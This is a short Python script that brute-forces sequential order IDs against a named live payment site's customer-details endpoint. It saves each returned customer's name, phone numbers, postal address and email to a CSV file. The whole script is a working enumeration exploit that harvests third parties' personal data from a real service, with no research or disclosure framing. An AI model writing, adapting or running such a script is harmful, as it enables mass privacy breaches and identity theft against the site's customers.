import requests

f = open("output.csv", "w")
splitted = ""
f.write("CustTitle,c_company,b_fname,b_lname,b_phone,c_phone,o_phone,b_street1,b_street2,b_city,countrycode,CustState,CustStateProvince,b_zip,b_zip1,b_country,b_email\n")

for i in range (16, 21):
    for j in range (1, 12):
        for k in range(99999):
            url = "https://www.guruaid.com/payment/fetch_customer_details.php?orderid=" + str(i) + str('{0:02}'.format(j)) + "-" + str('{0:05}'.format(k))
            print(url)
            r = requests.post(url)
            split = r.text.split(",")
            items = []
            for x in split:
                temp = x.split(":")
                if temp != ['']:
                    items.append(temp[1].strip('"'))
            if items != []:
                print(items[0] + "," + items[1] + "," + items[2] + "," + items[3] + "," + items[4] + "," 
                + items[5] + "," + items[6] + "," + items[7] + "," + items[8] + "," + items[9] + "," 
                + items[10] + "," + items[11] + "," + items[12] + "," + items[13] + "," + items[14] + ","
                + items[15] + "," + items[16][:-2])
                f.write(items[0] + "," + items[1] + "," + items[2] + "," + items[3] + "," + items[4] + "," 
                + items[5] + "," + items[6] + "," + items[7] + "," + items[8] + "," + items[9] + "," 
                + items[10] + "," + items[11] + "," + items[12] + "," + items[13] + "," + items[14] + ","
                + items[15] + "," + items[16][:-2] + "\n")
